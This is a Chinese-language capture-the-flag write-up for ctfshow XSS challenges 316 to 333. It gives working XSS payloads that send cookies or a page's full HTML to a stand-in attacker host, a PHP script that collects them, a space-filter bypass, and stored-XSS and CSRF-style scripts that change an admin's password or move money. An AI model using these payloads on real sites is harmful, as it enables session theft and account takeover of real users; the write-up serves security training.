---
title: ctfshow-xss
id: ctfshow-xss
date: 2021-09-04 17:38:33
sidebar_position: 8
---

<!-- more -->

xss平台：
[XSS平台-免费XSS平台 (xsshs.cn)](https://xsshs.cn/xss.php?do=login)
[XSS平台 - （支持http/https）XSS Platform](https://xss.pt/xss.php?do=login)

## 316

xss平台直接的payload贴进去就行

也可以用vps来拿：

开启vps的http服务(我用的是kali)：

```sh
service apache2 start
# 关闭用stop
service apache2 stop
```

然后写个php来将flag存在本地里，要注意的是要给tmp目录可写权限，不然是写不进去的

```php
<?php

$content = $_GET[1];
if(isset($content)){
        file_put_contents('tmp/flag.txt',$content);
}else{
        echo 'no date input';
}
```

然后传payload就行：

```html
<script>document.location.href='http://xxx/a.php?1='+document.cookie</script>
```



## 317-319

```html
<body onload="window.location.href='http://xxx/a.php?1='+document.cookie"></body>
```



## 320-326

过滤空格和xss，可以用`/`绕过

```html
<body/onload="window.location.href='http://yours-ip/a.php?1='+document.cookie"></body>
```

## 327

![](https://i.loli.net/2021/09/04/bLjMsCdUBQ3Yryw.png)
还是上面的payload，收件人要填admin来让机器人点击

## 328

登录注册，还有个页面提示只有管理员可以查看各个用户的用户名和密码
那么可以直接拿管理员的cookie，然后修改cookie伪造为管理员登录进行查看

在注册页面的密码处插入xss代码，等管理员点击用户管理页面就能触发存储xss
ps：这里body用不了了--改回script就可以

```html
<script>document.location.href='http://yours-ip/a.php?1='+document.cookie</script>
```



## 329

cookie用不了，不过因为可以执行js，可以爬整个html源码下来

```js
var img = new Image();
img.src = 'http://yours-ip/a.php?1='+document.getElementsByTagName('html')[0].innerHTML;
document.body.append(img);
```

```html
<script src="http://yours-ip/a.js"></script>
```

或者省略点根据html定位只取用户名和密码，也可以遍历定位ctfshow{xxx}都行

```js
document.querySelector('#top > div.layui-container').textContent;
```

## 330

要注意的是这里的插入点是注册的用户名
可以让管理员修改它的密码

```js
<script>window.location.href='http://127.0.0.1/api/change.php?p=123';</script>
```

也可以延续上题的做法继续爬源码
(就会发现表单里的用***加密了
flag出现在admin用户名旁)

## 331

可以在url/js/select.js找到post的js代码，修改一下，如下：

```js
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
```

将管理员密码修改登录即可

## 332

让admin给自己转钱：
![](https://i.loli.net/2021/09/04/aoTAX2QfhYdpK3w.png)
再去购买flag

## 333

自己给自己转钱，bp跑一下就好